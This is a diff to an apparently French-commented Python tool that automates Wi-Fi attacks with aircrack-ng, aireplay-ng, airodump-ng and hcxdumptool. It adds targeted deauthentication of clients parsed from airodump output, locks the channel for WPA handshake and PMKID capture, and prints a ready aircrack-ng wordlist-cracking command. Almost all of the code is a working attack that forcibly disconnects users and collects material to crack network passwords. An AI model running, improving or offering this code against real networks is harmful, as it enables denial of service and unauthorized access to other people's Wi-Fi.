@@ -211,68 +211,115 @@ def find_channel(mon, bssid, scan=12):
 
 
 # ----------------------------------------------------------- désauth/capture -
+def set_channel(mon, channel):
+    """Verrouille l'interface moniteur sur le canal cible (sinon elle 'saute')."""
+    if channel:
+        _run(["iw", "dev", mon, "set", "channel", str(channel)], timeout=10)
+
+
+def clients_of(csv_path, bssid):
+    """Clients (STATIONs) associés à la BSSID cible, lus dans le CSV airodump.
+    La désauth CIBLÉE d'un client force un handshake bien plus vite qu'un
+    broadcast (le client doit être présent et se re-authentifier)."""
+    if not os.path.exists(csv_path):
+        return []
+    clients, in_stations = [], False
+    try:
+        with open(csv_path, encoding="utf-8", errors="ignore") as fh:
+            for line in fh:
+                if line.startswith("Station MAC"):
+                    in_stations = True
+                    continue
+                if not in_stations:
+                    continue
+                cols = [c.strip() for c in line.split(",")]
+                # STATION, First, Last, Power, #pkts, BSSID, Probes
+                if (len(cols) >= 6
+                        and re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", cols[0])
+                        and cols[5].upper() == bssid.upper()):
+                    clients.append(cols[0])
+    except OSError:
+        pass
+    return clients
+
+
 def has_handshake(cap):
     if not (os.path.exists(cap) and os.path.getsize(cap) > 0):
         return False
     rc, out = _run_out(["aircrack-ng", cap], timeout=30)
+    # aircrack liste "WPA (N handshake)" quand la capture est exploitable
     return bool(re.search(r"\(\s*[1-9]\d*\s+handshake", out))
 
 
 def deauth_burst(mon, bssid, client, count):
     cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
     if client:
-        cmd += ["-c", client]
+        cmd += ["-c", client]      # désauth ciblée d'un client précis
     cmd.append(mon)
     _run(cmd, timeout=30)
 
 
 def capture_handshake(mon, bssid, channel, client, timeout, count, outdir):
     hdr("Capture du handshake WPA")
+    set_channel(mon, channel)
     prefix = os.path.join(outdir, f"handshake_{bssid.replace(':', '')}")
     for f in _globs(prefix + "*"):
         _rm(f)
+    csv = prefix + "-01.csv"
+    cap = prefix + "-01.cap"
     dump = subprocess.Popen(
         ["airodump-ng", "--bssid", bssid, "-c", str(channel),
          "-w", prefix, "--output-format", "pcap,csv", mon],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
     )
     _BG_PROCS.append(dump)
-    cap = prefix + "-01.cap"
     deadline = time.time() + timeout
-    time.sleep(3)  # laisse airodump se caler sur le canal
+    time.sleep(4)  # laisse airodump créer les fichiers et se caler sur le canal
     try:
         while time.time() < deadline:
             if dump.poll() is not None:
-                err("airodump-ng s'est arrêté prématurément.")
+                err("airodump-ng s'est arrêté prématurément "
+                    "(interface tombée du mode moniteur ?).")
                 return None
             remaining = int(deadline - time.time())
-            log(f"désauth de la cible ({count} trames)… {remaining}s restantes")
-            deauth_burst(mon, bssid, client, count)
-            time.sleep(6)
+            # cible = le client fourni, sinon les clients vus associés à l'AP
+            targets = [client] if client else clients_of(csv, bssid)
+            if targets:
+                log(f"désauth ciblée de {len(targets)} client(s) — {count} "
+                    f"trames — {remaining}s restantes")
+                for c in targets:
+                    deauth_burst(mon, bssid, c, count)
+            else:
+                log(f"aucun client visible — désauth broadcast — {remaining}s restantes")
+                deauth_burst(mon, bssid, None, count)
+            time.sleep(5)
             if has_handshake(cap):
                 ok(f"HANDSHAKE capturé → {cap}")
+                ok(f"crack :  aircrack-ng {cap} -w <wordlist>")
                 return cap
-        warn("timeout atteint sans handshake.")
+        warn("timeout atteint sans handshake (cible hors portée / aucun client actif ?).")
         return None
     finally:
         if dump.poll() is None:
             dump.terminate()
 
 
-def capture_pmkid(mon, bssid, timeout, outdir):
+def capture_pmkid(mon, bssid, channel, timeout, outdir):
     hdr("Capture du PMKID (clientless)")
     if shutil.which("hcxdumptool") is None:
         warn("hcxdumptool absent — capture PMKID ignorée "
              "(sudo apt install hcxdumptool hcxtools).")
         return None
+    if channel:
+        set_channel(mon, channel)
     pcap = os.path.join(outdir, f"pmkid_{bssid.replace(':', '')}.pcapng")
     _rm(pcap)
     # NB : la syntaxe de hcxdumptool varie selon la version ; on capture large
-    # puis on filtre la cible à la conversion. Adapte si ta version diffère.
-    proc = subprocess.Popen(
-        ["hcxdumptool", "-i", mon, "-o", pcap, "--enable_status=1"],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-    )
+    # (on filtre la cible à la conversion). Le canal restreint le balayage si connu.
+    cmd = ["hcxdumptool", "-i", mon, "-o", pcap, "--enable_status=1"]
+    if channel:
+        cmd += ["-c", str(channel)]
+    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     _BG_PROCS.append(proc)
     log(f"écoute PMKID pendant {timeout}s…")
     try:
@@ -404,7 +451,7 @@ def main():
             if cap:
                 results.append(("handshake", cap))
         if args.method in ("pmkid", "both"):
-            pm = capture_pmkid(mon, args.bssid, args.timeout, args.outdir)
+            pm = capture_pmkid(mon, args.bssid, channel, args.timeout, args.outdir)
             if pm:
                 results.append(("pmkid", pm))
 
